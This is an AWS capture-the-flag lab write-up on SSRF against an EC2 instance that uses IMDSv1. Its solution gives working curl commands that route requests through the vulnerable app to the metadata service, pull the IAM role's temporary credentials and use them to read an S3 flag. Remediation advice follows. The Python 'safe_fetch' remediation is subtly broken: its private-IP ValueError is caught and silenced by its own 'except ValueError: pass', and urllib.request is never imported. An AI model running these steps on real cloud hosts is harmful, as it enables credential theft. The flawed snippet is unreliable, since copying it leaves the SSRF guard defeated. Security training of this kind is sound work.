# Challenge 03: Exposed EC2 Instance Metadata (IMDSv1 + SSRF)

**Difficulty:** 🟡 Medium  
**Category:** Compute / Credential Access  
**MITRE ATT&CK:** [T1552.005 - Unsecured Credentials: Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)

---

## 🎯 Objective

A web application running on an EC2 instance is vulnerable to Server-Side Request Forgery (SSRF). The instance uses IMDSv1 (no token required). Exploit the SSRF to steal the instance's IAM credentials from the metadata service, then use them to retrieve the flag from S3.

---

## 🌍 Setup

```bash
cd challenges/03-ec2-metadata/terraform
terraform init && terraform apply
# Note the ssrf_app_url and flag_bucket_name from output
```

---

## 💡 Hints

<details>
<summary>Hint 1</summary>
The web app at port 8080 fetches any URL you give it. What internal URLs might be interesting on an EC2 instance?
</details>

<details>
<summary>Hint 2</summary>
The EC2 Instance Metadata Service is available at `http://169.254.169.254`. Try fetching that through the SSRF vulnerability.
</details>

<details>
<summary>Hint 3</summary>
IAM credentials are available at: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
</details>

---

## ✅ Solution

### Step 1 — Probe the SSRF vulnerability

```bash
SSRF_URL="http://<instance_ip>:8080"

# Test basic SSRF
curl "${SSRF_URL}/?url=http://169.254.169.254/latest/meta-data/"
```

### Step 2 — Navigate the metadata service

```bash
# Get the IAM role name
curl "${SSRF_URL}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns: ctf-03-ec2-role-xxxx

# Steal the credentials
curl "${SSRF_URL}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ctf-03-ec2-role-xxxx"
```

You'll get:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T12:00:00Z"
}
```

### Step 3 — Use stolen credentials

```bash
export AWS_ACCESS_KEY_ID=<stolen_key>
export AWS_SECRET_ACCESS_KEY=<stolen_secret>
export AWS_SESSION_TOKEN=<stolen_token>

# Access the flag bucket
aws s3 cp s3://<flag_bucket_name>/flag.txt -
```

🚩 **Flag:** `CTF{imdsv1_ssrf_credential_theft}`

---

## 🔍 MITRE ATT&CK Mapping

| Field | Detail |
|---|---|
| Tactic | Credential Access |
| Technique | T1552.005 — Unsecured Credentials: Cloud Instance Metadata API |
| Pre-condition | SSRF vulnerability in application (T1190) |
| Detection | CloudTrail: credential usage from unusual source IPs; IMDSv1 calls in VPC Flow Logs |

---

## 🛠️ Remediation

### Fix 1 — Enforce IMDSv2 (require session tokens)

```hcl
resource "aws_instance" "secure" {
  # ...
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"   # Enforces IMDSv2
    http_put_response_hop_limit = 1            # Prevents container escape
  }
}
```

With IMDSv2, a token must be fetched first:
```bash
# IMDSv2 requires a PUT request to get a token first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# SSRF cannot replicate this PUT request flow — attack fails
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### Fix 2 — SCP to enforce IMDSv2 across the org

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RequireIMDSv2",
      "Effect": "Deny",
      "Action": "ec2:RunInstances",
      "Resource": "arn:aws:ec2:*:*:instance/*",
      "Condition": {
        "StringNotEquals": {
          "ec2:MetadataHttpTokens": "required"
        }
      }
    }
  ]
}
```

### Fix 3 — Fix the SSRF vulnerability in application code

```python
# Never fetch arbitrary user-supplied URLs
# Use an allowlist of permitted domains/IPs
ALLOWED_HOSTS = ["api.example.com", "partner.example.com"]

def safe_fetch(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError(f"Host {parsed.hostname} not allowed")
    # Block private IP ranges
    import ipaddress
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("Private/internal IPs not allowed")
    except ValueError:
        pass  # hostname, not IP — OK after allowlist check
    return urllib.request.urlopen(url)
```

---

## 📚 Further Reading

- [AWS IMDSv2 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [MITRE T1552.005](https://attack.mitre.org/techniques/T1552/005/)
- [PortSwigger SSRF Guide](https://portswigger.net/web-security/ssrf)
